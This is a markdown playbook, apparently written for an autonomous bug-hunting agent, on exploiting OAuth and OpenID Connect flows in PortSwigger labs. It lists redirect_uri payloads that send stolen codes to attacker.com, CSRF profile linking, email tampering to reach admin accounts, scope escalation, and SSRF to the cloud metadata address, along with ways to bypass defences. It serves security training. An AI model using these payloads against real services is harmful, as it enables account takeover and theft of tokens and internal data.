# OAuth 2.0 / OpenID Connect Methodology
## Expert-Level Playbook for Autonomous Bug Hunting

> OAuth flaws come from weak redirect validation, missing state, unverified
> tokens, and over-trusting client-supplied data during registration/flow.

---

## Phase 1: Detection & Fingerprinting

### 1.1 Map the Flow
- Authorization Code vs Implicit (`response_type=code` vs `token`)
- Parties: client app, resource owner, OAuth/authorization server
- Grab the request to `/authorize`: note `client_id`, `redirect_uri`,
  `scope`, `state`, `response_type`.
- OIDC discovery: `GET /.well-known/openid-configuration`

### 1.2 Key Questions
- Is `redirect_uri` strictly validated?
- Is `state` present and bound to the user session (CSRF defense)?
- Are ID tokens/`userinfo` fields verified server-side, or trusted from client?

---

## Phase 2: Exploitation Techniques

### 2.1 redirect_uri Manipulation (Token/Code Theft)
```
&redirect_uri=https://attacker.com
&redirect_uri=https://target.com.attacker.com
&redirect_uri=https://target.com/callback/../redirect?url=attacker.com
```
- Steal the leaked `code`/`token` from your logged redirect and replay it.

### 2.2 Missing state -> CSRF (Account Takeover)
- No `state`? Force-link the victim's social login to YOUR account (or vice
  versa) via a pre-generated authorization request delivered to the victim.

### 2.3 Flawed Implicit Flow / Client-Trusted Identity
- If the client POSTs the user's email/id from the token to a `/authenticate`
  endpoint without server verification, change the email to `admin@...`.

### 2.4 Scope Upgrade
- Add extra scopes on the token request or during refresh; some servers grant
  them without re-consent.

### 2.5 SSRF via Dynamic Client Registration / request_uri
- Register a client whose `logo_uri`/`jwks_uri`/`request_uri` points at an
  internal metadata URL; the auth server fetches it -> SSRF (see ssrf.md).
- `request_uri` parameter can force server-side fetch of attacker JSON.

---

## Phase 3: PortSwigger Lab-Specific Techniques
- **Authentication bypass via OAuth implicit flow**: tamper the email in the
  POST to `/authenticate`.
- **Forced OAuth profile linking**: missing `state` -> CSRF link attacker acct.
- **OAuth account hijacking via redirect_uri**: steal the code with a malicious
  `redirect_uri`, then replay it in the victim's flow.
- **Stealing OAuth access tokens via a proxy page** (implicit): open redirect /
  referer leak of the token.
- **SSRF via OpenID dynamic client registration**: point `logo_uri` at cloud
  metadata (`http://169.254.169.254/...`).

---

## Phase 4: Tools & Automation
- Burp to capture and replay `/authorize` and `/callback`.
- Exploit server to host redirect/proxy pages and collect leaked codes/tokens.
- Decode ID tokens as JWTs (see jwt.md) and test alg/signature flaws.

---

## Common Failure Modes & Solutions
| Problem | Solution |
|---------|----------|
| redirect_uri strict | Try path traversal / subdomain / open-redirect chain |
| state enforced | CSRF linking blocked; attack redirect_uri or token instead |
| Token signature checked | Skip JWT forgery; target flow logic |

## Success Criteria
- [ ] Logged in as the victim / admin, or exfiltrated a code/token/secret
- [ ] Lab shows "solved"
